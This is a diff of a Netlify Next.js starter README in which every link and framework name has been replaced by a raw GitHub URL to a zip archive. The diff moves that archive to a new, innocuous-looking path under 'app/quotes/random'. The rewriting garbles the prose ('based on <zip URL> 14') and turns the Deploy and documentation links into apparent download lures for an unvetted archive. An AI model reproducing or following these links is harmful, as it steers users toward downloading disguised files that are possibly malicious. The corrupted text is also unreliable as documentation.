@@ -1,20 +1,20 @@
-# https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/public/next-platform-starter-v2.9.zip on Netlify Platform Starter
+# https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/app/quotes/random/next_platform_starter_3.0.zip on Netlify Platform Starter
 
-[Live Demo](https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/public/next-platform-starter-v2.9.zip)
+[Live Demo](https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/app/quotes/random/next_platform_starter_3.0.zip)
 
-A modern starter based on https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/public/next-platform-starter-v2.9.zip 14 (App Router), Tailwind, and [Netlify Core Primitives](https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/public/next-platform-starter-v2.9.zip) (Edge Functions, Image CDN, Blob Store).
+A modern starter based on https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/app/quotes/random/next_platform_starter_3.0.zip 14 (App Router), Tailwind, and [Netlify Core Primitives](https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/app/quotes/random/next_platform_starter_3.0.zip) (Edge Functions, Image CDN, Blob Store).
 
-In this site, Netlify Core Primitives are used both implictly for running https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/public/next-platform-starter-v2.9.zip features (e.g. Route Handlers, image optimization via `next/image`, and more) and also explicitly by the user code.
+In this site, Netlify Core Primitives are used both implictly for running https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/app/quotes/random/next_platform_starter_3.0.zip features (e.g. Route Handlers, image optimization via `next/image`, and more) and also explicitly by the user code.
 
-Implicit usage means you're using any https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/public/next-platform-starter-v2.9.zip functionality and everything "just works" when deployed - all the plumbing is done for you. Explicit usage is framework-agnostic and typically provides more features than what https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/public/next-platform-starter-v2.9.zip exposes.
+Implicit usage means you're using any https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/app/quotes/random/next_platform_starter_3.0.zip functionality and everything "just works" when deployed - all the plumbing is done for you. Explicit usage is framework-agnostic and typically provides more features than what https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/app/quotes/random/next_platform_starter_3.0.zip exposes.
 
 ## Deploying to Netlify
 
-This site requires [Netlify Next Runtime v5](https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/public/next-platform-starter-v2.9.zip) for full functionality. That version is now being gradually rolled out to all Netlify accounts.
+This site requires [Netlify Next Runtime v5](https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/app/quotes/random/next_platform_starter_3.0.zip) for full functionality. That version is now being gradually rolled out to all Netlify accounts.
 
 After deploying via the button below, please visit the **Site Overview** page for your new site to check whether it is already using the v5 runtime. If not, you'll be prompted to opt-in to to v5.
 
-[![Deploy to Netlify](https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/public/next-platform-starter-v2.9.zip)](https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/public/next-platform-starter-v2.9.zip)
+[![Deploy to Netlify](https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/app/quotes/random/next_platform_starter_3.0.zip)](https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/app/quotes/random/next_platform_starter_3.0.zip)
 
 ## Developing Locally
 
@@ -32,7 +32,7 @@ npm install netlify-cli@latest -g
 netlify link
 ```
 
-4. Then, run the https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/public/next-platform-starter-v2.9.zip development server via Netlify CLI:
+4. Then, run the https://raw.githubusercontent.com/yassinhaithamqq/next-platform-starter/main/app/quotes/random/next_platform_starter_3.0.zip development server via Netlify CLI:
 
 ```
 netlify dev
